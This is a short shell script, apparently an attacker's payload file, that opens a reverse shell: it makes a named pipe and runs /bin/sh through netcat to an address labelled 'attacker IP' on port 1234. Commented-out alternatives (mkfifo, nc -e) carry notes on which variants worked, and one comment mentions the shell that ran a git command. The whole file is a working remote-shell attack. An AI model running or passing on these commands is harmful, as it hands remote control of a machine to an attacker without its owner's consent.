touch HelloWorld

#attacker IP:192.168.180.134
#work
rm /tmp/backpipe ; mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc 192.168.180.134 1234 2>&1 1>/tmp/backpipe &

#work --- but can not use the shell any more which executed the git command.
#rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.180.134 1234 >/tmp/f&

#don't work --- nc: invalid option -- 'e'
#nc 127.0.0.1 2222 -e "/bin/sh"&

#don't work --- nc: getaddrinfo: Servname not supported for ai_socktype
#rm -f /tmp/p; mknod /tmp/p p && nc 192.168.180.134 1234 0/tmp/p
